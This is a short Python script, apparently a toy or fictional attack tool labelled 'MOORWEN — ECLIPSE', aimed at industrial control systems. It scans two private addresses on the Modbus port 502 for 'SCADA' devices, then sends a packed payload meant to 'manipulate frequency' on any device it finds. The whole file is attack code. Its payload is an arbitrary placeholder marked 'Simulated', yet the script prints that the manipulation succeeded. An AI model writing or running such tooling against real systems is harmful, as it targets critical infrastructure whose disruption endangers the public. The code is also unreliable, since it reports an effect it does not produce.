# ============================================================
# MOORWEN — ECLIPSE
# ============================================================

import socket
import struct

def scan_scada():
    targets = ["192.168.1.100", "192.168.1.101"]
    for target in targets:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, 502))  # Modbus default port
            print(f"[+] SCADA device found: {target}")
            return target
        except:
            pass
    return None

def manipulate_frequency(target):
    print(f"[*] Manipulating frequency on {target}")
    # Simulated frequency manipulation
    payload = struct.pack(">HHHH", 0x0001, 0x0002, 0x0003, 0x0004)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, 502))
    sock.send(payload)
    sock.close()
    print("[+] Frequency manipulated.")

target = scan_scada()
if target:
    manipulate_frequency(target)
